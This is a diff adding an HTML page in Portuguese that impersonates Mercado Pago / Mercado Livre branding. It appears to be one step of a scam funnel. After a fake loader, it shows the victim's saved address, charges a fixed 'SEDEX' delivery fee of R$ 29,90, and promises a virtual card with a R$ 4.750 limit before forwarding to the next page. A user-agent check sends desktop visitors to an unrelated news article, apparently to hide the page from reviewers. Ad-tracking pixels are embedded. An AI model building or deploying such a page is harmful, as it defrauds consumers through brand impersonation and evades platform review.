@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Confirmação de Entrega - mercado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #FFE600;
+        }
+
+        .decoration1 {
+            width: 200px;
+            height: 200px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+
+        .decoration2 {
+            width: 150px;
+            height: 150px;
+            bottom: 10%;
+            left: 5%;
+            background: #3483FA;
+            animation: float2 25s infinite ease-in-out;
+        }
+
+        .decoration3 {
+            width: 100px;
+            height: 100px;
+            top: 50%;
+            left: 50%;
+            background: #3483FA;
+            animation: float3 30s infinite ease-in-out;
+        }
+
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-20px, 20px) scale(1.1); }
+        }
+
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(20px, -20px) scale(0.9); }
+        }
+
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+
+        /* Header */
+        .header {
+            background: #FFE600;
+            padding: 20px 24px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Container */
+        .container {
+            max-width: 520px;
+            margin: 40px auto;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #EDEDED;
+            border-top: 4px solid #3483FA;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 15px;
+        }
+
+        .loading-subtext {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+            opacity: 0.8;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            display: none;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .main-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333333;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            text-align: center;
+            animation: titleAppear 1s ease-out;
+        }
+
+        @keyframes titleAppear {
+            from { transform: translateY(-10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #666666;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            text-align: center;
+            animation: fadeIn 1s ease-out 0.3s both;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .subtitle strong {
+            color: #00A650;
+            font-weight: 600;
+        }
+
+        /* Success Message */
+        .success-message {
+            background: rgba(0, 166, 80, 0.1);
+            border: 1px solid #00A650;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: successPulse 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .success-message::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: successShimmer 1.5s ease-out 0.5s;
+        }
+
+        @keyframes successPulse {
+            0% { transform: scale(0.95); opacity: 0; }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes successShimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .success-icon {
+            background: #00A650;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0, 166, 80, 0.3);
+            animation: iconBounce 0.8s ease-out 0.3s;
+        }
+
+        @keyframes iconBounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-8px); }
+            60% { transform: translateY(-4px); }
+        }
+
+        .success-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #00A650;
+        }
+
+        /* Info Cards */
+        .info-card {
+            background: #FFFFFF;
+            border: 1px solid #EDEDED;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            animation: cardSlideIn 0.6s ease-out;
+        }
+
+        .info-card:nth-child(even) {
+            animation-delay: 0.2s;
+        }
+
+        .info-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: #3483FA;
+            transform: scaleY(0);
+            transition: transform 0.3s ease;
+        }
+
+        .info-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.1);
+        }
+
+        .info-card:hover::before {
+            transform: scaleY(1);
+        }
+
+        @keyframes cardSlideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title::before {
+            content: '■';
+            color: #3483FA;
+            font-size: 10px;
+        }
+
+        .card-title.shipping-title::before {
+            content: '▲';
+            color: #00A650;
+        }
+
+        .address-info {
+            background: #F5F5F5;
+            border-radius: 8px;
+            padding: 20px;
+            color: #495057;
+            line-height: 1.8;
+            font-size: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .address-info::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            width: 20px;
+            height: 20px;
+            background-image: url('https://i.postimg.cc/G2Bxr3Kc/mapa.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.6;
+        }
+
+        .address-label {
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .address-label::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            background-image: url('https://i.postimg.cc/3RMQYVBR/casa.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .shipping-details {
+            background: #F5F5F5;
+            border-radius: 8px;
+            padding: 20px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .shipping-info {
+            flex: 1;
+            width: 100%;
+        }
+
+        .price-section {
+            text-align: center;
+            margin: 15px 0;
+            padding: 15px 0;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .price-section::before {
+            content: '';
+            width: 50px;
+            height: 1px;
+            background: #EDEDED;
+            margin-bottom: 10px;
+        }
+
+        .shipping-price {
+            font-size: 32px;
+            font-weight: 600;
+            color: #333333;
+            letter-spacing: 1px;
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            width: 100%;
+            margin: 0;
+        }
+
+        .shipping-price::before {
+            content: 'TOTAL DO ENVIO';
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #666666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            text-align: center;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-method {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 10px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-time {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-time::before {
+            content: '◉';
+            color: #3483FA;
+            font-size: 10px;
+        }
+
+        .shipping-features {
+            font-size: 13px;
+            color: #00A650;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 166, 80, 0.1);
+            padding: 8px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 166, 80, 0.2);
+            width: fit-content;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .shipping-features::before {
+            content: '✓';
+            color: #00A650;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        /* Button */
+        .confirm-button {
+            background: #3483FA;
+            color: #FFFFFF;
+            padding: 20px 50px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 131, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: buttonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .confirm-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.6s ease;
+            transform: translateY(-50%);
+        }
+
+        .confirm-button:hover {
+            background: #2968C8;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.4);
+        }
+
+        .confirm-button:hover::before {
+            left: 100%;
+        }
+
+        .confirm-button:active {
+            transform: translateY(-1px);
+        }
+
+        /* Virtual Card Section */
+        .virtual-card-section {
+            background: rgba(0, 166, 80, 0.08);
+            border: 1px solid rgba(0, 166, 80, 0.2);
+            border-radius: 8px;
+            padding: 25px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .virtual-card-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: virtualShimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes virtualShimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .virtual-card-icon {
+            background: #00A650;
+            width: 50px;
+            height: 50px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0, 166, 80, 0.3);
+            position: relative;
+            overflow: hidden;
+            background-image: url('https://i.postimg.cc/pTXvB9Cb/cartoes-de-credito.png');
+            background-size: 30px 30px;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .virtual-card-icon img {
+            display: none;
+        }
+
+        .virtual-card-content {
+            flex: 1;
+        }
+
+        .virtual-card-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #00A650;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .virtual-card-title::before {
+            content: '◉';
+            color: #00A650;
+            font-size: 12px;
+        }
+
+        .virtual-card-text {
+            font-size: 14px;
+            color: #2E7D32;
+            line-height: 1.6;
+        }
+
+        .highlight {
+            font-weight: 700;
+            color: #3483FA;
+            font-size: 16px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+
+        .footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+
+        .footer a {
+            color: #3483FA;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .bg-decoration .decoration {
+                display: none;
+            }
+
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+
+            .container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+            
+            .main-title, .loading-text {
+                font-size: 22px;
+            }
+            
+            .info-card {
+                padding: 20px;
+            }
+            
+            .virtual-card-section {
+                padding: 20px;
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+
+            .shipping-details {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .shipping-price {
+                text-align: center;
+                align-self: center;
+            }
+
+            .shipping-method {
+                font-size: 18px;
+            }
+
+            .confirm-button {
+                padding: 18px 40px;
+                font-size: 15px;
+            }
+
+            .virtual-card-icon {
+                width: 40px;
+                height: 40px;
+            }
+
+            .address-info::before {
+                top: 10px;
+                right: 10px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="https://i.postimg.cc/jS6Z8kTp/logo.png" alt="mercado">
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Loading Screen -->
+        <div class="loading-screen" id="loadingScreen">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Gerando a taxa de entrega...</div>
+            <div class="loading-subtext">Aguarde um momento</div>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="success-screen" id="successScreen">
+            <h1 class="main-title">Confirmação de Entrega</h1>
+            <p class="subtitle">Confirme os detalhes do seu pedido antes de finalizar</p>
+
+            <div class="success-message">
+                <div class="success-icon">✓</div>
+                <div class="success-text">Taxa de envio gerada com sucesso!</div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-title">Detalhes do Envio</div>
+                <div class="address-info">
+                    <span class="address-label">Endereço de entrega:</span>
+                    <div id="endereco-entrega">Carregando endereço...</div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-title shipping-title">Método de Envio</div>
+                <div class="shipping-details">
+                    <div class="shipping-info">
+                        <div class="shipping-method" id="metodo-envio">Carregando...</div>
+                        <div class="shipping-time" id="prazo-envio">Carregando prazo...</div>
+                        <div class="shipping-features">Rastreamento incluído</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="price-section">
+                <div class="shipping-price" id="preco-envio">R$ 0,00</div>
+            </div>
+
+            <button class="confirm-button" onclick="confirmarEnvio()">SIM, VOU QUERER!</button>
+
+            <div class="virtual-card-section">
+                <div class="virtual-card-icon">
+                    <img src="https://i.postimg.cc/ZnBbVpVF/sem-contato.png" alt="Cartão">
+                </div>
+                <div class="virtual-card-content">
+                    <div class="virtual-card-title">Cartão Virtual Disponível Hoje</div>
+                    <div class="virtual-card-text">
+                        Você receberá hoje seu cartão virtual com limite de <span class="highlight">R$ 4.750</span> para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+        <p>CNPJ: 10.573.521/0001-91 · <a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </div>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais da página de confirmação SEDEX:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO (COM CORREÇÃO)
+        // =======================================================
+
+        // Carregamento real dos dados das páginas anteriores
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('📱 Página de confirmação SEDEX carregada, iniciando loading...');
+            console.log('📊 Parâmetros da URL:', getUrlParams());
+            
+            // Carrega dados existentes no localStorage
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('userdata') || '{}');
+                dadosExistentes.pagina_confirmacao_sedex_acesso = new Date().toISOString();
+                dadosExistentes.url_atual = window.location.href;
+                localStorage.setItem('userdata', JSON.stringify(dadosExistentes));
+            } catch(e) {
+                console.log('Erro ao carregar dados:', e);
+            }
+            
+            setTimeout(() => {
+                console.log('✅ Loading completo, mostrando tela de confirmação...');
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('successScreen').style.display = 'block';
+                
+                // Carrega e exibe o endereço e método de envio
+                carregarEndereco();
+                carregarMetodoEnvio();
+            }, 3000); // 3 segundos de loading
+        });
+
+        function carregarEndereco() {
+            const enderecoDiv = document.getElementById('endereco-entrega');
+            
+            try {
+                const dadosUsuario = JSON.parse(localStorage.getItem('userdata') || '{}');
+                console.log('📥 Carregando endereço da página anterior...');
+                console.log('📊 Dados disponíveis:', dadosUsuario);
+                
+                // Busca endereço nos dados salvos
+                const endereco = dadosUsuario.endereco_entrega || 
+                                 dadosUsuario.endereco || 
+                                 dadosUsuario.address ||
+                                 dadosUsuario.delivery_address ||
+                                 null;
+                
+                console.log('🏠 Endereço encontrado:', endereco);
+                
+                if (endereco && typeof endereco === 'object') {
+                    let enderecoFormatado = '';
+                    
+                    if (endereco.endereco_completo) {
+                        enderecoFormatado = endereco.endereco_completo;
+                    } else if (endereco.endereco_simples) {
+                        enderecoFormatado = endereco.endereco_simples;
+                    } else {
+                        enderecoFormatado = montarEnderecoFromCampos(endereco);
+                    }
+                    
+                    if (enderecoFormatado && enderecoFormatado.length > 5) {
+                        enderecoDiv.innerHTML = enderecoFormatado;
+                    } else {
+                        enderecoDiv.innerHTML = 'Endereço cadastrado nas etapas anteriores';
+                    }
+                } else {
+                    enderecoDiv.innerHTML = '<em style="color: #666666;">Endereço será confirmado durante o processo de entrega</em>';
+                }
+            } catch(e) {
+                console.log('Erro ao carregar endereço:', e);
+                enderecoDiv.innerHTML = '<em style="color: #666666;">Endereço será confirmado durante o processo de entrega</em>';
+            }
+        }
+
+        function montarEnderecoFromCampos(endereco) {
+            const rua = endereco.endereco || endereco.rua || endereco.street || '';
+            const numero = endereco.numero || endereco.number || '';
+            const complemento = endereco.complemento || endereco.complement || '';
+            const bairro = endereco.bairro || endereco.district || '';
+            const cidade = endereco.cidade || endereco.city || '';
+            const estado = endereco.estado || endereco.uf || endereco.state || '';
+            const cep = endereco.cep || endereco.zipcode || '';
+            
+            let resultado = '';
+            
+            if (rua) {
+                resultado += rua;
+                if (numero) resultado += `, ${numero}`;
+                if (complemento) resultado += `, ${complemento}`;
+                resultado += '<br>';
+            }
+            
+            if (bairro || cidade) {
+                if (bairro) resultado += bairro;
+                if (bairro && cidade) resultado += ' - ';
+                if (cidade) resultado += cidade;
+                if (estado && (bairro || cidade)) resultado += `/${estado}`;
+                resultado += '<br>';
+            }
+            
+            if (cep) {
+                resultado += `CEP: ${cep}`;
+            }
+            
+            return resultado;
+        }
+
+        function carregarMetodoEnvio() {
+            console.log('📦 Carregando método de envio SEDEX...');
+            
+            // Valores fixos para SEDEX
+            const nomeMetodo = 'SEDEX';
+            const tempoEntrega = '1 dia útil';
+            const precoEnvio = 'R$ 29,90';
+            
+            // Atualiza os elementos na página
+            document.getElementById('metodo-envio').textContent = nomeMetodo;
+            document.getElementById('prazo-envio').textContent = `Prazo de entrega: ${tempoEntrega}`;
+            document.getElementById('preco-envio').textContent = precoEnvio;
+            
+            console.log('✅ Método SEDEX carregado:', {
+                nome: nomeMetodo,
+                tempo: tempoEntrega,
+                preco: precoEnvio
+            });
+        }
+
+        function confirmarEnvio() {
+            // Salva dados no localStorage (SEM passar via URL)
+            try {
+                const dadosExistentes = JSON.parse(localStorage.getItem('userdata') || '{}');
+                dadosExistentes.etapa_atual = 'confirmacao_envio_final';
+                dadosExistentes.envio_confirmado = true;
+                dadosExistentes.confirmacao_data = new Date().toISOString();
+                dadosExistentes.metodo_confirmado = 'SEDEX';
+                dadosExistentes.preco_confirmado = '29,90';
+                localStorage.setItem('userdata', JSON.stringify(dadosExistentes));
+                console.log('✅ Dados salvos no localStorage:', dadosExistentes);
+            } catch(e) {
+                console.log('Erro ao salvar:', e);
+            }
+            
+            // =======================================================
+            // REDIRECIONAMENTO ATUALIZADO PARA PRESERVAR PARÂMETROS
+            // =======================================================
+            const proximaUrl = buildUrlWithParams('14-1.html');
+            
+            console.log('URL atual:', window.location.href);
+            console.log('Próxima URL:', proximaUrl);
+            console.log('Envio SEDEX confirmado!');
+            
+            // Redirecionar para próxima página
+            window.location.href = proximaUrl;
+        }
+    </script>
+</body>
+</html>
